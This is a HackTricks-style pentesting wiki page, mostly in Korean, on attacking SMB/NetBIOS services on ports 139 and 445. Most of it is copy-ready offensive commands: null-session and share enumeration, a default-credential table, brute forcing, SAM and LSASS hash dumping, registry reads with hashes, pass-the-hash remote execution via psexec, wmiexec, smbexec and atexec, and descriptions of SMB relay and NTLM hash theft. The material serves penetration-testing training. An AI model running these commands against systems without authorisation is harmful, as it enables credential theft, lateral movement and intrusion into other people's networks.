# 139,445 - Pentesting SMB

{{#include ../../banners/hacktricks-training.md}}

## **Port 139**

The _**Network Basic Input Output System**_** (NetBIOS)**은 로컬 영역 네트워크(LAN) 내의 애플리케이션, PC 및 데스크톱이 네트워크 하드웨어와 상호작용하고 **네트워크 상에서 데이터 전송을 용이하게 하기** 위해 설계된 소프트웨어 프로토콜입니다. NetBIOS 네트워크에서 동작하는 소프트웨어 애플리케이션의 식별 및 위치 파악은 최대 16자까지 허용되는 NetBIOS 이름을 통해 이루어지며, 이 이름은 종종 컴퓨터 이름과 다릅니다. 두 애플리케이션 간의 NetBIOS 세션은 한 애플리케이션(클라이언트 역할)이 다른 애플리케이션(서버 역할)을 "호출"하기 위해 명령을 발행할 때 **TCP Port 139**를 사용하여 시작됩니다.
```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```
## Port 445

Technically, Port 139 is referred to as ‘NBT over IP’, whereas Port 445 is identified as ‘SMB over IP’. The acronym **SMB** stands for ‘**Server Message Blocks**’, which is also modernly known as the **Common Internet File System (CIFS)**. As an application-layer network protocol, SMB/CIFS is primarily utilized to enable shared access to files, printers, serial ports, and facilitate various forms of communication between nodes on a network.

For example, in the context of Windows, it is highlighted that SMB can operate directly over TCP/IP, eliminating the necessity for NetBIOS over TCP/IP, through the utilization of port 445. Conversely, on different systems, the employment of port 139 is observed, indicating that SMB is being executed in conjunction with NetBIOS over TCP/IP.
```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
### SMB

**Server Message Block (SMB)** 프로토콜은 **클라이언트-서버** 모델로 동작하며 프린터나 라우터 같은 네트워크 자원뿐만 아니라 **파일 접근**, 디렉터리 등에 대한 접근을 규정하도록 설계되었습니다. 주로 **Windows** 계열 운영체제에서 사용되며, SMB는 하위 호환성을 보장하여 최신 버전의 Microsoft 운영체제를 사용하는 장치가 구버전 장치와 원활히 상호작용할 수 있게 합니다. 또한 **Samba** 프로젝트는 무료 소프트웨어 솔루션을 제공하여 **Linux** 및 Unix 시스템에서 SMB를 구현할 수 있게 하고, 이를 통해 플랫폼 간 통신을 가능하게 합니다.

공유(shares)는 로컬 파일 시스템의 **임의의 부분(arbitrary parts of the local file system)** 을 나타내며, SMB 서버가 이를 제공하면 클라이언트에게 보이는 계층 구조가 서버의 실제 구조와 부분적으로 **독립적(independent)** 으로 될 수 있습니다. **Access Control Lists (ACLs)** 는 **접근 권한(access rights)** 을 정의하며 사용자 권한에 대해 **세분화된 제어(fine-grained control)** 를 허용합니다. 여기에는 `execute`, `read`, 및 `full access` 같은 속성이 포함되며, 이러한 권한은 공유별로 개별 사용자나 그룹에 부여될 수 있고 서버에 설정된 로컬 권한과는 구분됩니다.

### IPC$ Share

IPC$ share에 대한 접근은 익명 null session을 통해 얻을 수 있으며, 이를 통해 named pipes로 노출된 서비스와 상호작용할 수 있습니다. 이 용도로 유용한 유틸리티는 `enum4linux` 입니다. 적절히 사용하면 다음을 얻을 수 있습니다:

- 운영 체제에 대한 정보
- 상위 도메인에 대한 세부 정보
- 로컬 사용자 및 그룹 목록
- 사용 가능한 SMB 공유 정보
- 적용 중인 시스템 보안 정책

이 기능은 네트워크 관리자와 보안 전문가가 네트워크상의 SMB (Server Message Block) 서비스의 보안 태세를 평가하는 데 중요합니다. `enum4linux`는 대상 시스템의 SMB 환경에 대한 포괄적인 뷰를 제공하므로 잠재적 취약점을 식별하고 SMB 서비스가 적절히 보호되어 있는지 확인하는 데 필수적입니다.
```bash
enum4linux -a target_ip
```
위 명령은 `enum4linux`가 `target_ip`로 지정된 대상에 대해 full enumeration을 수행하는 예시입니다.

## NTLM이란

NTLM이 무엇인지 모르거나 이 프로토콜이 어떻게 동작하고 어떻게 악용할 수 있는지 알고 싶다면, **NTLM**에 관한 다음 페이지가 매우 흥미로울 것입니다. 이 페이지에서는 **이 프로토콜이 어떻게 동작하고 어떻게 활용할 수 있는지** 설명합니다:


{{#ref}}
../../windows-hardening/ntlm/
{{#endref}}

## **서버 Enumeration**

### **Scan** 네트워크에서 호스트를 검색:
```bash
nbtscan -r 192.168.0.1/24
```
### SMB 서버 버전

SMB 버전에 대한 가능한 exploits를 찾으려면, 사용 중인 버전을 아는 것이 중요합니다. 이 정보가 다른 도구에 표시되지 않는다면, 다음을 시도하세요:

- 다음 **MSF** auxiliary module `**auxiliary/scanner/smb/smb_version**`를 사용하세요.
- 또는 이 스크립트:
```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```
### **검색 exploit**
```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```
### **가능한** 자격 증명

| **Username(s)**      | **Common passwords**                      |
| -------------------- | ----------------------------------------- |
| _(blank)_            | _(blank)_                                 |
| guest                | _(blank)_                                 |
| Administrator, admin | _(blank)_, password, administrator, admin |
| arcserve             | arcserve, backup                          |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                   |
| backupexec, backup   | backupexec, backup, arcada                |
| test, lab, demo      | password, test, lab, demo                 |

### Brute Force

- [**SMB Brute Force**](../../generic-hacking/brute-force.md#smb)

### SMB 환경 정보

### 정보 수집
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
### 사용자, 그룹 및 로그인한 사용자 열거

이 정보는 이미 enum4linux 및 enum4linux-ng에서 수집되었어야 합니다.
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```
### 로컬 사용자 열거

[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
```bash
lookupsid.py -no-pass hostname.local
```
원라이너
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
### Metasploit - 로컬 사용자 열거
```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```
### **LSARPC 및 SAMR rpcclient 열거**


{{#ref}}
rpcclient-enumeration.md
{{#endref}}

### GUI connection from linux

#### In the terminal:

`xdg-open smb://cascade.htb/`

#### In file browser window (nautilus, thunar, etc)

`smb://friendzone.htb/general/`

## 공유 폴더 열거

### 공유 폴더 나열

항상 무언가에 접근할 수 있는지 확인하세요. credentials가 없다면 **null** **credentials/guest user**를 사용해 보세요.
```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```
### **공유 폴더 연결/목록 보기**
```bash
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```
### **수동으로 windows shares를 열거하고 연결하기**

호스트 머신의 shares를 표시하는 것이 제한되어 있어 목록을 확인하면 연결할 수 있는 share가 전혀 없는 것처럼 보일 수 있습니다. 따라서 특정 share에 수동으로 연결을 시도해보는 것이 좋습니다. shares를 수동으로 열거하려면 유효한 세션(예: null session 또는 valid credentials)을 사용할 때 NT_STATUS_ACCESS_DENIED 또는 NT_STATUS_BAD_NETWORK_NAME와 같은 응답을 확인해 보세요. 이러한 응답은 해당 share가 존재하지만 접근 권한이 없음을 나타내거나, 해당 share가 전혀 존재하지 않음을 뜻할 수 있습니다.

Common share names for windows targets are

- C$
- D$
- ADMIN$
- IPC$
- PRINT$
- FAX$
- SYSVOL
- NETLOGON

(Common share names from _**Network Security Assessment 3rd edition**_)

다음 명령을 사용하여 해당 share들에 연결을 시도해볼 수 있습니다
```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
```
또는 이 스크립트 (null session 사용)
```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
```
예제
```bash
smbclient -U '%' -N \\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
```
### **Windows에서 shares 열거하기 / 타사 도구 없이**

PowerShell
```bash
# Retrieves the SMB shares on the locale computer.
Get-SmbShare
Get-WmiObject -Class Win32_Share
# Retrieves the SMB shares on a remote computer.
get-smbshare -CimSession "<computer name or session object>"
# Retrieves the connections established from the local SMB client to the SMB servers.
Get-SmbConnection
```
CMD 콘솔
```shell
# List shares on the local computer
net share
# List shares on a remote computer (including hidden ones)
net view \\<ip> /all
```
MMC Snap-in (그래픽 기반)
```shell
# Shared Folders: Shared Folders > Shares
fsmgmt.msc
# Computer Management: Computer Management > System Tools > Shared Folders > Shares
compmgmt.msc
```
explorer.exe (그래픽 인터페이스)에서 `\\<ip>\` 를 입력하면 사용 가능한 non-hidden shares를 볼 수 있습니다.

### 공유 폴더 마운트
```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```
### **파일 다운로드**

이전 섹션을 참조하여 credentials/Pass-the-Hash를 사용해 연결하는 방법을 배우세요.
```bash
#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
```

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```
명령어:

- mask: 디렉터리 내 파일을 필터링하는 데 사용되는 mask를 지정합니다 (예: "" = 모든 파일)
- recurse: 재귀 기능을 켜거나 끕니다 (기본값: off)
- prompt: 파일명 입력 프롬프트를 끕니다 (기본값: on)
- mget: mask와 일치하는 모든 파일을 호스트에서 클라이언트 머신으로 복사합니다

(_smbclient의 manpage에서 가져온 정보_)

### 도메인 공유 폴더 검색

- [**Snaffler**](https://github.com/SnaffCon/Snaffler)
```bash
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```
- [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) spider.
- `-M spider_plus [--share <share_name>]`
- `--pattern txt`
```bash
sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
```
특히 shares에서 주목할 만한 파일로는 **`Registry.xml`** 가 있는데, 이는 **Group Policy**를 통해 **autologon**으로 구성된 사용자들의 **passwords** 를 포함하고 있을 수 있습니다. 또는 **`web.config`** 파일도 credentials 를 포함하고 있습니다.

> [!TIP]
> **SYSVOL share** 는 도메인의 모든 인증된 사용자에게 **readable** 합니다. 그 안에서 다양한 batch, VBScript, 그리고 PowerShell **scripts** 를 **find** 할 수 있습니다.\
> 그 안의 **scripts** 를 반드시 **check** 해야 합니다 — **passwords** 같은 민감한 정보가 포함되어 있을 수 있습니다.

## 레지스트리 읽기

발견한 일부 credentials 를 사용하면 **레지스트리** 를 **read** 할 수 있을지도 모릅니다. Impacket **`reg.py`** 를 사용해 시도해볼 수 있습니다:
```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```
## Post Exploitation

The **Samba** 서버의 **기본 설정**은 보통 `/etc/samba/smb.conf`에 위치하며 몇 가지 **위험한 설정**이 있을 수 있습니다:

| **Setting**                 | **Description**                                                     |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | 현재 공유에서 사용 가능한 항목들을 나열하도록 허용합니까?              |
| `read only = no`            | 파일 생성 및 수정을 금지합니까?                                     |
| `writable = yes`            | 사용자가 파일을 생성하고 수정할 수 있도록 허용합니까?                |
| `guest ok = yes`            | 비밀번호 없이 서비스에 연결할 수 있도록 허용합니까?                  |
| `enable privileges = yes`   | 특정 SID에 할당된 권한을 적용합니까?                                |
| `create mask = 0777`        | 새로 생성된 파일에 어떤 권한이 부여되어야 합니까?                    |
| `directory mask = 0777`     | 새로 생성된 디렉토리에 어떤 권한이 부여되어야 합니까?                |
| `logon script = script.sh`  | 사용자 로그인 시 어떤 스크립트가 실행되어야 합니까?                  |
| `magic script = script.sh`  | 스크립트가 종료될 때 어떤 스크립트가 실행되어야 합니까?              |
| `magic output = script.out` | magic script의 출력이 어디에 저장되어야 합니까?                     |

The command `smbstatus` gives information about the **서버** and about **연결된 사용자**.

## Kerberos를 사용해 인증

도구 **smbclient**와 **rpcclient**를 사용해 **kerberos**에 **인증**할 수 있습니다:
```bash
smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
```
Kerberos 전용 환경(NTLM 비활성화)에서는 SMB에 대한 NTLM 시도가 `STATUS_NOT_SUPPORTED`를 반환할 수 있습니다. 일반적인 Kerberos 문제를 해결하고 Kerberos auth를 강제하세요:
```bash
# sync clock to avoid KRB_AP_ERR_SKEW
sudo ntpdate <dc.fqdn>

# use Kerberos with tooling (reads your TGT from ccache)
netexec smb <dc.fqdn> -k
```
완전한 클라이언트 설정(krb5.conf 생성, kinit, SSH GSSAPI/SPN 주의사항)은 다음을 참조하세요:

{{#ref}}
../pentesting-kerberos-88/README.md
{{#endref}}

## **명령 실행**

### **crackmapexec**

crackmapexec는 mmcexec, smbexec, atexec, wmiexec 중 어느 것이든 활용해 명령을 실행할 수 있으며, 기본 방법은 wmiexec입니다. 선호하는 옵션은 `--exec-method` 매개변수로 지정할 수 있습니다:
```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```
### [**psexec**](../../windows-hardening/lateral-movement/psexec-and-winexec.md)**/**[**smbexec**](../../windows-hardening/lateral-movement/smbexec.md)

두 옵션 모두 피해자 머신에 (SMB를 통해 _\pipe\svcctl_ 를 사용하여) **새 서비스를 생성**하고 이를 사용해 **무언가를 실행**합니다 (**psexec**는 실행 파일을 ADMIN$ share에 **업로드**하고, **smbexec**는 **cmd.exe/powershell.exe**를 가리키며 인자로 페이로드를 넣습니다 — **file-less technique**).\
**자세한 정보**는 [**psexec** ](../../windows-hardening/lateral-movement/psexec-and-winexec.md)와 [**smbexec**](../../windows-hardening/lateral-movement/smbexec.md)를 참고하세요.\
In **kali** it is located on /usr/share/doc/python3-impacket/examples/
```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
```
Using **parameter**`-k`를 사용하면 **NTLM** 대신 **kerberos**로 인증할 수 있습니다.

### [wmiexec](../../windows-hardening/lateral-movement/wmiexec.md)/dcomexec

디스크를 건드리거나 새로운 서비스를 실행하지 않고 DCOM을 통해 **port 135.**으로 은밀하게 명령 셸을 실행합니다.\
**kali**에서는 /usr/share/doc/python3-impacket/examples/에 위치합니다.
```bash
#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
**파라미터**`-k`를 사용하면 **NTLM** 대신 **kerberos**로 인증할 수 있습니다.
```bash
#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
### [AtExec](../../windows-hardening/lateral-movement/atexec.md)

작업 스케줄러를 통해 명령을 실행합니다 (SMB를 통해 _\pipe\atsvc_ 사용).\
**kali**에서는 /usr/share/doc/python3-impacket/examples/
```bash
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```
## Impacket 참조

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

### ksmbd 공격 표면 및 SMB2/SMB3 프로토콜 fuzzing (syzkaller)

{{#ref}}
ksmbd-attack-surface-and-fuzzing-syzkaller.md
{{#endref}}

## **Bruteforce 사용자 인증 정보**

**권장하지 않습니다. 허용된 최대 시도 횟수를 초과하면 계정이 차단될 수 있습니다**
```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
```
## SMB relay attack

이 공격은 Responder 툴킷을 사용해 내부 네트워크에서 **SMB authentication sessions**을 캡처하고, 이를 **target machine**으로 **relays**합니다. 인증 **session이 성공할 경우**, 자동으로 **system shell**로 진입하게 됩니다.  
[**이 공격에 대한 자세한 정보는 여기.**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

Windows 라이브러리 URLMon.dll은 페이지가 SMB를 통해 어떤 콘텐츠에 접근하려 할 때 자동으로 호스트에 인증을 시도합니다. 예: `img src="\\10.10.10.10\path\image.jpg"`

이 동작은 다음 함수들에서 발생합니다:

- URLDownloadToFile
- URLDownloadToCache
- URLOpenStream
- URLOpenBlockingStream

이는 일부 브라우저와 도구(예: Skype)에서 사용됩니다.

![From: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../../images/image (358).png>)

### SMBTrap using MitMf

![From: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../../images/image (892).png>)

## NTLM Theft

SMB Trapping과 유사하게, 악성 파일을 타깃 시스템에 심는 것(예: SMB를 통해)은 SMB 인증 시도를 유발할 수 있으며, Responder 같은 도구로 NetNTLMv2 해시를 가로챌 수 있습니다. 그 해시는 오프라인에서 크랙하거나 [SMB relay attack](#smb-relay-attack)에 사용할 수 있습니다.

[See: ntlm_theft](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm_theft)

## HackTricks Automatic Commands
```
Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMB
Note: |
While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html

Entry_2:
Name: Enum4Linux
Description: General SMB Scan
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB Scan 1
Description: SMB Vuln Scan With Nmap
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb Scan 2
Description: SMB Vuln Scan With Nmap (Less Specific)
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 consolesless mfs enumeration
Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'

```
## 참고 자료

- [NetExec (CME) wiki – Kerberos usage](https://www.netexec.wiki/)
- [Pentesting Kerberos (88) – client setup and troubleshooting](../pentesting-kerberos-88/README.md)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)

{{#include ../../banners/hacktricks-training.md}}
